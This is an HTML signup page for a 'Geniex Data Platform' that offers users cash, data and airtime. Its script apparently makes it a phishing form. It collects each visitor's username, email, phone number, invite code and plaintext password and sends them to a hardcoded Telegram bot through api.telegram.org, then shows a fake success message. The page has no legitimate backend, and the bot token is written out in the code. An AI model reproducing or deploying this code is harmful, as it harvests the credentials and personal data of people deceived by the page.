<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Geniex Data Platform</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #8A3EB2;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .form-container {
      background-color: #000;
      padding: 30px 40px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(138, 62, 178, 0.6);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .form-container i {
      font-size: 50px;
      color: white;
      margin-bottom: 15px;
    }

    .form-container h1 {
      font-size: 22px;
      margin-bottom: 5px;
    }

    .form-container p {
      font-size: 14px;
      color: #ccc;
      margin-bottom: 20px;
    }

    .form-container input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #8A3EB2;
      border-radius: 8px;
      background-color: #111;
      color: white;
    }

    .form-container input:focus {
      outline: none;
      border-color: #b76eff;
    }

    .form-container button {
      width: 100%;
      padding: 12px;
      background-color: white;
      color: #8A3EB2;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: 0.3s ease;
      margin-top: 10px;
    }

    .form-container button:hover {
      background-color: #eee;
    }

    .form-container .login-link {
      margin-top: 15px;
      font-size: 14px;
    }

    .form-container .login-link a {
      color: #b76eff;
      text-decoration: none;
    }

    .form-container .login-link a:hover {
      text-decoration: underline;
    }

    .success-box {
      background-color: #28a745;
      padding: 8px 12px;
      margin-bottom: 15px;
      border-radius: 6px;
      color: white;
      display: none;
      font-size: 14px;
      align-items: center;
      justify-content: center;
      gap: 6px;
      animation: fadeIn 0.5s ease-in-out forwards;
    }

    .success-box i {
      font-size: 16px;
      margin-right: 6px;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(-5px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
  </style>
</head>
<body>

  <div class="form-container">
    <div class="success-box" id="successBox">
      <i class="fas fa-check-circle"></i> Registration Successful. Proceed to login...
    </div>

    <i class="fas fa-database"></i>
    <h1>Welcome to Geniex Data Platform</h1>
    <p>Earn Cash, Data, Airtime at ease</p>

    <form id="signupForm">
      <input type="text" id="username" placeholder="Username" required>
      <input type="email" id="email" placeholder="Email" required>
      <input type="tel" id="phone" placeholder="Phone Number" required>
      <input type="text" id="invite" placeholder="Invite Code" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Sign Up</button>
    </form>

    <div class="login-link">
      Already have an account? <a href="login.html">Log in</a>
    </div>
  </div>

  <script>
    document.getElementById("signupForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const email = document.getElementById("email").value;
      const phone = document.getElementById("phone").value;
      const invite = document.getElementById("invite").value;
      const password = document.getElementById("password").value;

      const message = `
/saveUser
ðŸŸ£ *New Geniex Registration*
ðŸ‘¤ *Username:* ${username}
ðŸ“§ *Email:* ${email}
ðŸ“± *Phone:* ${phone}
ðŸ”— *Invite Code:* ${invite}
ðŸ”’ *Password:* ${password}
`;

      const token = "7771412415:AAFU8jVhc-OyvCigmEAMSbeiPFrGkr4zhOQ";
      const chat_id = "6707173438";
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message,
          parse_mode: "Markdown"
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          const successBox = document.getElementById("successBox");
          successBox.style.display = "flex";
          successBox.style.opacity = 0;
          void successBox.offsetWidth;
          successBox.style.animation = "fadeIn 0.5s ease-in-out forwards";

          setTimeout(() => {
            window.location.href = "login.html";
          }, 2500);
        } else {
          alert("Something went wrong. Please try again.");
        }
      })
      .catch(error => {
        console.error("Error:", error);
        alert("Unable to send data. Please check your internet.");
      });
    });
  </script>

</body>
</html>
